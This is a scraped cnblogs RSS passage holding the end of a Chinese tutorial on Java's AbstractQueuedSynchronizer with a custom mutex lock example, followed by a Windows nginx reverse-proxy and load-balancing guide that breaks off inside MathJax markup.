&lt;/ol&gt;&lt;h2 id=&quot;三共享模式获取与释放状态&quot;&gt;三，共享模式获取与释放状态&lt;/h2&gt;
&lt;p&gt;共享模式和独占模式最主要的区别是在&lt;strong&gt;支持同一时刻有多个线程同时获取同步状态&lt;/strong&gt;。为了避免带来额外的负担，在上文中提到的同步队列中都是用独占模式进行讲述，其实同步队列中的节点应该是独占和共享节点并存的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233125056-1459011349.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来将针对共享模式状态下获取与释放状态的过程，图文并茂得进行分析。&lt;/p&gt;
&lt;h3 id=&quot;获取同步状态-1&quot;&gt;3.1 获取同步状态&lt;/h3&gt;
&lt;ol readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;首先至少要调用一次tryAcquireShared(arg)方法，如果返回值大于等于0表示获取成功。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;当获取锁失败时，则创建一个共享类型的节点并进入一个同步队列，然后进入队列中进入自旋状态（阻塞，唤醒两种状态来回切换，直到获取到同步状态为止）&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;当队列中的等待线程被唤醒以后就重新尝试获取锁资源，如果成功则&lt;strong&gt;唤醒后面还在等待的共享节点并把该唤醒事件传递下去，即会依次唤醒在该节点后面的所有共享节点&lt;/strong&gt;，否则继续挂起等待。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233126033-2079605281.png&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;当一个同享节点获取到同步状态，并唤醒后面等待的共享状态的结果如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233127018-1280581551.png&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
  * 共享模式获取同步状态；
  * 1. 首先至少要调用一次tryAcquireShared(arg)方法，如果返回值大于等于0表示获取成功，直接返回结果即可
  * 2. 否则，将会加入到同步队列中，反复阻塞与唤醒，直到获取同步状态成功为止； 获取成功后会唤醒后面还在等待的共享节点并把该唤醒事件传递下去，即会依次唤醒在该节点后面的所有共享节点
  */
public final void acquireShared(int arg) {
    if (tryAcquireShared(arg) &amp;lt; 0)
        doAcquireShared(arg);
}

/**
  * 2. 自旋模式获取同步状态
  */
private void doAcquireShared(int arg) {
    // 2.1 第一次获取失败后，会将此线程加入到同步队列中
    final Node node = addWaiter(Node.SHARED);
    boolean failed = true;
    try {
        boolean interrupted = false;
        for (;;) {
            // 如果前驱节点是头节点，尝试获取同步状态
            final Node p = node.predecessor();
            if (p == head) {
                // r &amp;gt; 0表示获取同步状态成功，并且还有共享类型节点在同步队列中
                // r == 0 表示获取同步状态成功，同步队列中没有其他共享模式节点
                int r = tryAcquireShared(arg);
                if (r &amp;gt;= 0) {
                    // ！！！！ 获取同步状态成功后，将当前node设置为头节点，并向后传播，唤醒共享模式等待的节点
                    setHeadAndPropagate(node, r);
                    p.next = null; // help GC
                    if (interrupted)
                        selfInterrupt();
                    failed = false;
                    return;
                }
            }
            if (shouldParkAfterFailedAcquire(p, node) &amp;amp;&amp;amp;
                parkAndCheckInterrupt())
                interrupted = true;
        }
    } finally {
        if (failed)
            cancelAcquire(node);
    }
}

/**
 * 设置新的头结点，并设置后面需要唤醒的节点
 */ 
private void setHeadAndPropagate(Node node, int propagate) {
    Node h = head; // Record old head for check below
    setHead(node);
    // propagate &amp;gt; 0 表明后面需要唤醒的共享模式节点
    if (propagate &amp;gt; 0 || h == null || h.waitStatus &amp;lt; 0 ||
        (h = head) == null || h.waitStatus &amp;lt; 0) {
        Node s = node.next;
         // 如果当前节点的后继节点是共享类型或者没有后继节点，则进行唤醒
         // 这里可以理解为除非明确指明不需要唤醒（后继等待节点是独占类型），否则都要唤醒
        if (s == null || s.isShared())
            doReleaseShared();
    }
}
/**
 * 唤醒所有共享模式节点
 */
private void doReleaseShared() {
        for (;;) {
            // 唤醒操作由头结点开始，注意这里的头节点已经是上面新设置的头结点了
            // 其实就是唤醒上面新获取到共享锁的节点的后继节点
            Node h = head;
            if (h != null &amp;amp;&amp;amp; h != tail) {
                int ws = h.waitStatus;
                // 表示后继节点需要被唤醒
                if (ws == Node.SIGNAL) {
                    //这里需要控制并发，因为入口有setHeadAndPropagate跟release两个，避免两次unpark
                    if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))
                        continue;      
                    //执行唤醒操作      
                    unparkSuccessor(h);
                }
                //如果后继节点暂时不需要唤醒，则把当前节点状态设置为PROPAGATE确保以后可以传递下去
                else if (ws == 0 &amp;amp;&amp;amp;
                         !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))
                    continue;                
            }
            // 如果头结点没有发生变化，表示设置完成，退出循环
            // 如果头结点发生变化，比如说其他线程获取到了锁，为了使自己的唤醒动作可以传递，必须进行重试
            if (h == head)                   
                break;
        }
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最后，获取到同步状态的线程执行完毕，同步队列中只有一个独占节点：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233127738-796396474.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;释放同步状态-1&quot;&gt;3.2 释放同步状态&lt;/h3&gt;
&lt;p&gt;释放同步状态后，同步队列的变化过程和共享节点获取到同步状态后的变化过程一致，此处不再进行赘述。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * 释放同步状态，如果释放成功，唤醒后面等待的节点
 *
 */
public final boolean releaseShared(int arg) {
    // 1. 尝试释放同步状态
    if (tryReleaseShared(arg)) {
         // 2. 释放成功后，唤醒后续等待共享节点
         doReleaseShared();
        return true;
    }
    return false;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;四基于aqs实现互斥锁&quot;&gt;四，基于AQS实现互斥锁&lt;/h2&gt;
&lt;p&gt;读到此处，大部分人应该还比较懵逼，似懂非懂。接下来笔者将通过AQS实现一个互斥锁带你打开AQS的正确打开姿势。&lt;/p&gt;
&lt;p&gt;多线程环境count += 1可能会存在问题，详情可以看在&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg3OTA1MjY4MQ==&amp;amp;mid=2247483656&amp;amp;idx=1&amp;amp;sn=7eb663ac5881b2d850547d5f0da5d547&amp;amp;chksm=cf0b13eef87c9af86b98f6de1e95d1cfa853936cd6202eb5b927b6c3af2a9f54936c8fdc7716&amp;amp;token=57308900&amp;amp;lang=zh_CN#rd&quot;&gt;并发编程bug的来源&lt;/a&gt;中介绍的三大原因。正如大多数人都知道的，我们通常可以使用synchronized关键字进行同步，接下来我们就基于AQS自定义一个互斥锁来完成相同的功能。&lt;/p&gt;
&lt;h3 id=&quot;代码实现&quot;&gt;4.1 代码实现&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * 自定义互斥锁
 *
 * @author cruder
 * @time 2019/11/29 23:23
 */
public class MutexLock {

    private static final Sync STATE_HOLDER = new Sync();

    /**
     * 通过Sync内部类来持有同步状态， 当状态为1表示锁被持有，0表示锁处于空闲状态
     */
    private static class Sync extends AbstractQueuedSynchronizer {

        /**
         * 是否被独占， 有两种表示方式
         *  1. 可以根据状态，state=1表示锁被占用，0表示空闲
         *  2. 可以根据当前独占锁的线程来判断，即getExclusiveOwnerThread()!=null 表示被独占
         */
        @Override
        protected boolean isHeldExclusively() {
            return getExclusiveOwnerThread() != null;
        }

        /**
         * 尝试获取锁，将状态从0修改为1，操作成功则将当前线程设置为当前独占锁的线程
         */
        @Override
        protected boolean tryAcquire(int arg) {
            if (compareAndSetState(0, 1)) {
                setExclusiveOwnerThread(Thread.currentThread());
                return true;
            }
            return false;
        }

        /**
         * 释放锁，将状态修改为0
         */
        @Override
        protected boolean tryRelease(int arg) {
            if (getState() == 0) {
                throw new UnsupportedOperationException();
            }
            setExclusiveOwnerThread(null);
            setState(0);
            return true;
        }

    }

    /**
     * 下面的实现Lock接口需要重写的方法，基本是就是调用内部内Sync的方法
     */
    public void lock() {
        STATE_HOLDER.acquire(1);
    }

    public void unlock() {
        STATE_HOLDER.release(1);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;锁的测试&quot;&gt;4.2 锁的测试&lt;/h3&gt;
&lt;p&gt;我们定义一个计数器类，里面定义了2个不同的计数方法，其中一个使用互斥锁进行同步。开启10个线程并发执行，每个线程计数10000次，然后对比统计结果与预期的100，000是否相符。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;package myLock;

import java.util.concurrent.*;

/**
 * 自定义锁测试
 *
 * @author liqiang
 * @time 2019/11/29 12:39
 */
public class MyLockTest {

    public static void main(String[] args) throws InterruptedException {
        int threadNum = 10;
        int countPerThread = 10000;
        // 线程池创建的正确姿势
        ThreadPoolExecutor threadPool = new ThreadPoolExecutor(threadNum, threadNum, 1000, TimeUnit.SECONDS, new ArrayBlockingQueue&amp;lt;&amp;gt;(10), new ThreadPoolExecutor.AbortPolicy());
        CountDownLatch countDownLatch = new CountDownLatch(threadNum);
        Counter counter = new Counter();
        Counter counterUnsafe = new Counter();

        for (int i = 0; i &amp;lt; threadNum; i++) {
            threadPool.submit(() -&amp;gt; {
                for (int j = 0; j &amp;lt; countPerThread; j++) {
                    counter.getAndIncrement();
                    counterUnsafe.getAndIncrementUnSfae();
                }
                countDownLatch.countDown();
            });
        }
        countDownLatch.await();
        System.out.printf(&quot;%s 个线程，每个线程累加了 %s 次，执行结果：safeCounter = %s, unsafeCounter = %s &quot;, threadNum, countPerThread, counter.get(), counterUnsafe.get());
        threadPool.shutdownNow();
    }

}

class Counter {
    private MutexLock mutexLock;
    private volatile int count;

    Counter() {
        this.mutexLock = new MutexLock();
    }

    int get() {
        return count;
    }

    int getAndIncrement() {
        mutexLock.lock();
        count++;
        mutexLock.unlock();
        return count;
    }

    int getAndIncrementUnSfae() {
        count++;
        return count;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://source.mycookies.cn/201911300744_953.png?ERROR&quot;/&gt;&lt;br/&gt;结果和预期一样，用自定义锁实现的计数器统计没有误差。&lt;/p&gt;
&lt;h2 id=&quot;五总结&quot;&gt;五，总结&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;AQS通过一个int同步状态码，和一个（先进先出）队列来控制多个线程访问资源&lt;/li&gt;
&lt;li&gt;支持独占和共享两种模式获取同步状态码&lt;/li&gt;
&lt;li&gt;当线程获取同步状态失败会被加入到同步队列中&lt;/li&gt;
&lt;li&gt;当线程释放同步状态，会唤醒后继节点来获取同步状态&lt;/li&gt;
&lt;li&gt;共享模式下的节点获取到同步状态或者释放同步状态时，不仅会唤醒后继节点，还会向后传播，唤醒所有同步节点&lt;/li&gt;
&lt;li&gt;使用volatile关键字保证状态码在线程间的可见性，CAS操作保证修改状态码过程的原子性。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;AQS的设计与实现比本文中描述的要稍微复杂一些，为了达到快速入门的效果所以本文进行了简化。对于没有讲到的内容，比如，&lt;strong&gt;对于独占模式下超时获取同步状态， 队列中节点状态的流转， 条件队列&lt;/strong&gt;等没有讲到的内容，将会放到下一篇文章中进行介绍。&lt;/p&gt;
&lt;h2 id=&quot;六qa&quot;&gt;六，Q&amp;amp;A&lt;/h2&gt;
&lt;p&gt;Question1： 在java中通常使用synchronized来实现方法同步，AQS中通过CAS保证了修改同步状态的一致性问题，那么对比synchronized，cas有什么优势不同与优势呢？你还知道其他无锁并发的策略吗？&lt;/p&gt;
&lt;p&gt;我的相关文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg3OTA1MjY4MQ==&amp;amp;mid=2247483656&amp;amp;idx=1&amp;amp;sn=7eb663ac5881b2d850547d5f0da5d547&amp;amp;chksm=cf0b13eef87c9af86b98f6de1e95d1cfa853936cd6202eb5b927b6c3af2a9f54936c8fdc7716&amp;amp;token=57308900&amp;amp;lang=zh_CN#rd&quot;&gt;一文搞懂并发编程bug的来源&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg3OTA1MjY4MQ==&amp;amp;mid=2247483662&amp;amp;idx=1&amp;amp;sn=0fd7532988619f458287a9667a1fe134&amp;amp;chksm=cf0b13e8f87c9afe3590ae318a08d530e7832ec31f8fdd041924f1c200c592eaf1e470d51fb0&amp;amp;token=57308900&amp;amp;lang=zh_CN#rd&quot;&gt;无锁并发的CAS为何如此优秀&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;https://www.jianshu.com/p/1161d33fc1d0&lt;/p&gt;
&lt;p&gt;《Java并发编程的艺术》&lt;/p&gt;
&lt;p&gt;《Java并发编程实战》&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1055780/201911/1055780-20191129233128393-424825825.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 29 Nov 2019 15:31:00 +0000</pubDate>
<dc:creator>浪人~</dc:creator>
<og:description>AQS是并发编程中非常重要的概念，它是juc包下的许多并发工具类，如CountdownLatch，CyclicBarrier，Semaphore 和锁, 如ReentrantLock， ReaderW</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/liqiangchn/p/11960944.html</dc:identifier>
</item>
<item>
<title>windows下的nginx应用 - Mr陈二</title>
<link>http://www.cnblogs.com/chenhg/p/11960941.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenhg/p/11960941.html</guid>
<description>&lt;ul&gt;&lt;li&gt;
&lt;h2&gt;&lt;strong&gt;nginx（背景）&lt;/strong&gt;&lt;/h2&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　　　nginx是一个高性能的HTTP服务器，以前我经常在linux系统中配置，主要做反向代理和负载均衡，最近根据业务需要，需要在window中配置反向和负载，下面就介绍一下nginx的安装与使用&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;h2&gt;nginx介绍&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;　Nginx是一款&lt;a href=&quot;https://baike.so.com/doc/585215-619452.html&quot; target=&quot;_blank&quot;&gt;轻量级&lt;/a&gt;的&lt;a href=&quot;https://baike.so.com/doc/4230501-4432285.html&quot; target=&quot;_blank&quot;&gt;Web&lt;/a&gt; 服务器/&lt;a href=&quot;https://baike.so.com/doc/5345781-5581226.html&quot; target=&quot;_blank&quot;&gt;反向代理&lt;/a&gt;服务器及&lt;a href=&quot;https://baike.so.com/doc/928072-980969.html&quot; target=&quot;_blank&quot;&gt;电子邮件&lt;/a&gt;(IMAP/POP3)代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少，&lt;a href=&quot;https://baike.so.com/doc/6916691-7138566.html&quot; target=&quot;_blank&quot;&gt;并发&lt;/a&gt;能力强　并发量在50,000 【官方】&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;h2&gt;&lt;strong&gt;nginx的下载和安装&lt;/strong&gt;&lt;/h2&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　　　　　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180523213803003-194580100.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　下载解压：&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524111800103-2042165314.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 　　　　　　　　　　进入nginx文件夹，双击nginx.exe即可简单启动【命令在最后会贴出来】&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　双击后黑窗口闪退，可以在任务管理器中查看nginx进程&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524112015445-1543998184.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　　　　　　　　　然后在浏览器输入localhost&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524112106783-1404851489.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　nginx的简单启动已经测试通过&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;strong&gt;注意：根据不同的系统可能会出现80端口被占用的情况，eg，在win10下，80端口可能被IIS程序占用，只需要改nginx的默认端口就行了&lt;/strong&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;ul&gt;&lt;li&gt;
&lt;h2&gt;nginx的反向代理&lt;/h2&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　　　反向代理：是指以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器；并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。&lt;/p&gt;
&lt;p&gt;　　　　正向代理：只用于代理内部网络对Internet的连接请求，客户机必须指定代理服务器,并将本来要直接发送到Web服务器上的http请求发送到代理服务器中&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　　　图解反向代理和正向代理[补充]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　正向代理类似一个跳板机，通过跳板机去访问外部资源&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524130500032-550706261.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　正向代理的用处：&lt;/p&gt;
&lt;p&gt;　　　　　　　　（1）访问原来无法访问的资源，如google&lt;/p&gt;
&lt;p&gt;     　　　　 　　 （2） 可以做缓存，加速访问资源&lt;/p&gt;
&lt;p&gt;　　              　　（3）对客户端访问授权，上网进行认证&lt;/p&gt;
&lt;p&gt;　　              　　（4）代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息&lt;/p&gt;
&lt;p&gt;　　　　反向代理：&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524130738366-1819150023.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　反向代理的好处：&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　保证内网的安全，负载均衡&lt;/p&gt;
&lt;hr/&gt;
&lt;ul&gt;&lt;li&gt;
&lt;h2&gt;nginx的反向代理配置&lt;/h2&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　　　上面已经简单介绍反向代理与正向代理的区别，这样有助于大家理解反向代理的好处，下面就具体介绍一下nginx反向代理的配置&lt;/p&gt;
&lt;p&gt;　　　　　　在介绍反向代理之前先给大家说一下动静分离的问题：&lt;/p&gt;
&lt;p&gt;　　　　　　动静分离的处理也是nginx的一个特点，把静态文件交给nginx来处理，可以增加系统的性能，把大批量的静态文件以nginx的方式去加载，然后去访问，不用在系统请求中获得，减少与系统交互次数，这也是系统优化的一种方式：&lt;/p&gt;
&lt;p&gt;　　　　　　配置文件如下：nginx.conf&lt;/p&gt;
&lt;p&gt;　　　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524142215759-525536803.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　　　然后重启nginx    nginx  -s  reload即可     验证如下&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524142900398-372606431.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　　　　　上面这是配置动静分离的步骤，这也是反向代理的一种特殊情况，下面我来配置一下关于tomcat的反向代理&lt;/p&gt;
&lt;p&gt;　　　　　　反向代理的配置文件如下：&lt;/p&gt;
&lt;p&gt;　　　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524154929633-705910233.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　验证如下：&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524155204473-1886497758.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　　　　　到这，单个server下的配置反向代理已经基本完成，多个server块下的配置与此类似，在此不在多放截图，有兴趣的可以自己手动配置一下进行验证&lt;/p&gt;
&lt;hr/&gt;&lt;ul&gt;&lt;li&gt;
&lt;h2&gt;nginx的负载均衡&lt;/h2&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　　　nginx的负载均衡是nginx的一个亮点，也是核心点，nginx的高并发，服务器的合理请求划分都是通过负载来直接或者间接实现的，下面我介绍集中负载均衡的实现以及适用场景&lt;/p&gt;
&lt;p&gt;　　　　负载均衡：把原先一台服务器的请求分发到不同服务器，以实现服务器减压的目的。（个人理解）&lt;/p&gt;
&lt;p&gt;　　　　　　　　　 负载均衡建立在现有网络结构之上，它提供了一种&lt;a href=&quot;https://baike.so.com/doc/6467569.html&quot; target=&quot;_blank&quot;&gt;廉价&lt;/a&gt;有效&lt;a href=&quot;https://baike.so.com/doc/6781847.html&quot; target=&quot;_blank&quot;&gt;透明&lt;/a&gt;的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的&lt;a href=&quot;https://baike.so.com/doc/1281694.html&quot; target=&quot;_blank&quot;&gt;灵活性&lt;/a&gt;和可用性（百度）&lt;/p&gt;
&lt;p&gt;　　　　负载均衡的分类：软件负载均衡和硬件负载均衡     软件主要包括（nginx，lvs,netscaler）    硬件主要包括F5&lt;/p&gt;
&lt;p&gt;　　　　下面我简单配置一下负载均衡的实现：需要至少两台tomcat服务器进行模拟。&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1112611/201805/1112611-20180524161154382-700934382.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　关于负载均衡的几种方式参考   &lt;a href=&quot;http://www.cnblogs.com/huhongy/p/7300118.html&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/huhongy/p/7300118.html&lt;/a&gt;&lt;/p&gt;

&lt;hr/&gt;
&lt;p&gt;　　　　　　关于nginx的命令，主要有&lt;/p&gt;
&lt;p&gt;　　　　　　　有dos命令进如nginx的文件夹下&lt;/p&gt;
&lt;p&gt;　　　　　　　start　nginx    启动nginx   在任务管理器中查看&lt;/p&gt;
&lt;p&gt;　　　　　　　nginx -s reload    重新加载配置文件使其生效&lt;/p&gt;
&lt;p&gt;　　　　　　　nginx -s stop   关闭    任务管理器中kill&lt;/p&gt;
&lt;p&gt;　　　　　　　nginx -s quit   关闭    任务管理器中&lt;strong&gt;不&lt;/strong&gt;kill&lt;/p&gt;
&lt;p&gt;　　　　　　　其他命令自己百度&lt;/p&gt;

&lt;hr/&gt;
&lt;h2&gt;补充：&lt;/h2&gt;
&lt;p&gt;nginx一些常见问题：    root和alias的对比区别：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46.5&quot;&gt;
&lt;div class=&quot;cnblogs_code_toolbar&quot;&gt;&lt;span class=&quot;cnblogs_code_copy&quot;&gt;&lt;a title=&quot;复制代码&quot;&gt;&lt;img src=&quot;https://common.cnblogs.com/images/copycode.gif&quot; alt=&quot;复制代码&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;pre readability=&quot;6&quot;&gt;
   location /h2 {
            alias     d:/newfiber/;
            index    index.php index.html index.htm;
            autoindex on;
        }
            
    location /maven {
            root     d:/newfiber;
            index    index.php index.html index.htm;
            autoindex on;
        }
   注意：1&amp;gt;alias  路径后面必须有 /   root 可加可不加
            2&amp;gt; alias 访问的就是alias的指定文件（夹）路径
                root访问的是组合路径   路径+ uri    
               eg:
                alias  :   d:/newfiber/;
                root   :  d:/newfiber/maven&lt;p&gt;2   proxy_pass配置说明    &lt;strong&gt;主要看proxy_pass http://localhost:8888 |   &lt;/strong&gt;&lt;strong&gt;http://localhost:8888/&lt;/strong&gt;&lt;strong&gt; 最后是否有 /&lt;/strong&gt;
&lt;/p&gt;&lt;/pre&gt;
&lt;p&gt;   # 不带 /     location  /gitbucket&lt;br/&gt;   # proxy_pass http://localhost:8888; ---------&amp;gt; location 的 /gitbucket 作为一级目录&lt;/p&gt;&lt;p&gt;   # 带 /       localtion /gitbucket&lt;br/&gt;   # proxy_pass http://localhost:8888/; ---------&amp;gt;location 的 /gitbucket 不作为一级目录&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;   location /gitbucket {&lt;br/&gt;     proxy_pass http://localhost:8888/gitbucket/;&lt;br/&gt;     proxy_set_header Host &lt;span class=&quot;MathJax_Preview&quot;&gt;&lt;span id=&quot;MathJax-Element-1-Frame&quot; class=&quot;MathJax&quot; data-mathml=&quot;&amp;lt;math xmlns=&amp;quot;http://www.w3.org/1998/Math/MathML&amp;quot;&amp;gt;&amp;lt;mi&amp;gt;h&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;o&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;s&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;t&amp;lt;/mi&amp;gt;&amp;lt;mo&amp;gt;;&amp;lt;/mo&amp;gt;&amp;lt;mi&amp;gt;p&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;r&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;o&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;x&amp;lt;/mi&amp;gt;&amp;lt;msub&amp;gt;&amp;lt;mi&amp;gt;y&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;s&amp;lt;/mi&amp;gt;&amp;lt;/msub&amp;gt;&amp;lt;mi&amp;gt;e&amp;lt;/mi&amp;gt;&amp;lt;msub&amp;gt;&amp;lt;mi&amp;gt;t&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;h&amp;lt;/mi&amp;gt;&amp;lt;/msub&amp;gt;&amp;lt;mi&amp;gt;e&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;a&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;d&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;e&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;r&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;X&amp;lt;/mi&amp;gt;&amp;lt;mo&amp;gt;&amp;amp;#x2212;&amp;lt;/mo&amp;gt;&amp;lt;mi&amp;gt;F&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;o&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;r&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;w&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;a&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;r&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;d&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;e&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;d&amp;lt;/mi&amp;gt;&amp;lt;mo&amp;gt;&amp;amp;#x2212;&amp;lt;/mo&amp;gt;&amp;lt;mi&amp;gt;F&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;o&amp;lt;/mi&amp;gt;&amp;lt;mi&amp;gt;r&amp;lt;/mi&amp;gt;&amp;lt;/math&amp;gt;&quot;&gt;&lt;span id=&quot;MathJax-Span-1&quot; class=&quot;math&quot;&gt;&lt;span id=&quot;MathJax-Span-2&quot; class=&quot;mrow&quot;&gt;&lt;span id=&quot;MathJax-Span-3&quot; class=&quot;mi&quot;&gt;h&lt;span id=&quot;MathJax-Span-4&quot; class=&quot;mi&quot;&gt;o&lt;span id=&quot;MathJax-Span-5&quot; class=&quot;mi&quot;&gt;s&lt;span id=&quot;MathJax-Span-6&quot; class=&quot;mi&quot;&gt;t&lt;span id=&quot;MathJax-Span-7&quot; class=&quot;mo&quot;&gt;;&lt;span id=&quot;MathJax-Span-8&quot; class=&quot;mi&quot;&gt;p&lt;span id=&quot;MathJax-Span-9&quot; class=&quot;mi&quot;&gt;r&lt;span id=&quot;MathJax-Span-10&quot; class=&quot;mi&quot;&gt;o&lt;span id=&quot;MathJax-Span-11&quot; class=&quot;mi&quot;&gt;x&lt;span id=&quot;MathJax-Span-12&quot; class=&quot;msubsup&quot;&gt;&lt;span id=&quot;MathJax-Span-13&quot; class=&quot;mi&quot;&gt;y&lt;span id=&quot;MathJax-Span-14&quot; class=&quot;mi&quot;&gt;s&lt;span id=&quot;MathJax-Span-15&quot; class=&quot;mi&quot;&gt;e&lt;span id=&quot;MathJax-Span-16&quot; class=&quot;msubsup&quot;&gt;&lt;span id=&quot;MathJax-Span-17&quot; class=&quot;mi&quot;&gt;t&lt;span id=&quot;MathJax-Span-18&quot; class=&quot;mi&quot;&gt;h&lt;span 